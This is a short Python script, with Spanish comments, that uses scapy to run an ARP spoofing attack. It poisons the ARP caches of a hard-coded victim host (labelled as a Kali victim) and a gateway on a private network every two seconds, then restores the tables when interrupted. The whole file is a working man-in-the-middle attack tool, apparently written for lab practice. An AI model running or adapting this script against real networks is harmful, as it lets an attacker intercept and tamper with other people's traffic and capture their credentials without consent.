import scapy.all as scapy
import time
import argparse
import sys
from getmac import get_mac_address

def spoffing(ip_objetivo, ip_spoff):
    mac_destino = get_mac_address(ip=ip_objetivo)
    packet = scapy.ARP(op=2, pdst= ip_objetivo, hwdst= mac_destino,psrc=ip_spoff)
    scapy.send(packet, verbose = False)

def restaurar(ip_destino, ip_origen):
    mac_des = get_mac_address(ip = ip_destino)
    mac_ori = get_mac_address(ip= ip_origen)
    packet = scapy.ARP(op=2, pdst = ip_destino, hwdst= mac_des,psrc=ip_origen, hwsrc= mac_ori)
    scapy.send(packet, count=4)

packets = 0

ip_objetivo = "192.168.1.16"#Kali victima
ip_gateway = "192.168.1.11"




try:
    while True:
        spoffing(ip_objetivo, ip_gateway)
        spoffing(ip_gateway, ip_objetivo)
        print("enviado")
        sys.stdout.flush()
        packets +=2
        time.sleep(2)
except KeyboardInterrupt:
    print("Tablas ARP Restarurados")
    restaurar(ip_objetivo,ip_gateway)
    restaurar(ip_gateway, ip_objetivo)